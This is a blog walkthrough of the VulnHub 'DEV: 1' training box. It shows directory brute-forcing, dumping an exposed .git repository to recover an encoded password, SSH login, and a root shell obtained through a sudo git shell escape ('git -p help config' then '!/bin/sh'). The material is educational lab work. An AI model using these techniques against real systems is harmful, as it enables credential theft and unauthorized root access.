## Introduction
*Easy level Linux box.  
This box "dev" aims to educate people on common and misconfigurations of a widely used developer tool.  
Use a good wordlist!*

This is [DEV: 1](https://www.vulnhub.com/entry/dev-1,574/) from vulnhub. 

## Ports
We have two ports only, SSH and HTTP on the standard port 80.

## HTTP
We've got a hint that we're looking for a development tool and we need a decent wordlist. I run gobuster with a big list:

``
root@kali:/opt/vulnhub/dev# gobuster dir -u http://192.168.1.137 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 
``

And it turns up a **/wwwdev** directory. Within that is our target, **.git**.

## GIT
I use git sometimes so I am somewhat familiar with it; however I saw IPPSEC use a nice tool called [git-dumper](https://github.com/arthaud/git-dumper) which I have never used before. I decided to give it a try. I clone the repo into **/opt/git-dumper** and run:

``
root@kali:/opt/vulnhub/dev# /opt/gitdumper/git-dumper.py http://192.168.1.137/wwwdev/ repo
``

It works perfectly. Checking *git log* we see:

>root@kali:/opt/vulnhub/dev/repo# git log  
commit 8072e242fdc09129cac94c569f6cc5ee0aef8059 (HEAD -> main, origin/main)  
Author: User <f3dai@dev.local>  
Date:   Mon Oct 12 23:44:09 2020 +0100  
    updated: removed file  
commit f9e2a3675f4b2f2196276fd11cac9d210a2fc737  
Author: User <f3dai@dev.local>  
Date:   Mon Oct 12 23:43:00 2020 +0100  
    First commit :)

So we only have two commits, and the second one removed a file. Let's check the first one:

``
root@kali:/opt/vulnhub/dev/repo# git checkout f9e2a3675f4b2f2196276fd11cac9d210a2fc737
``

Once we've done that we have a file called **cred** with the contents:

>D1yceX0jgixhk (slime)

This is a vignere cipher encoded password with the key *slime*; it decodes to:

>L1nusT0rvalds

With this, we can SSH in as **f3dai** (our git user from above).

## Privsec
Once we're in as *f3dai*, we find out he can run *git* as root with sudo, which is a nice touch. [GTFOBins](https://gtfobins.github.io/gtfobins/git/#sudo) shows how we can take advantage of that:

{% highlight shell %}
f3dai@dev:~$ sudo -l
Matching Defaults entries for f3dai on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User f3dai may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/git
	
f3dai@dev:~$ sudo -u root /usr/bin/git -p help config
// then
!/bin/sh
# cd /root
# ls
root.txt
# cat root.txt
37c24213df088bb485e97b7ce1929e09
{% endhighlight %}

This wasn't overly complicated and didn't take too long but I enjoyed it; thanks **f3da1**.


## A parting note
I also completed [Praying: 1](https://www.vulnhub.com/entry/praying-1,575/) from Vulnhub but I'm not going to write it up as a separate entry. Foothold was via a PHP webapp called *Mantis* with an unauthenticated RCE vulnerability, then we escalated through three users by finding their credentials, and then privesc was the same as [Funbox next level](https://blog.gibbons.digital/hacking/2020/10/01/nextlevel.html) with **dd**.
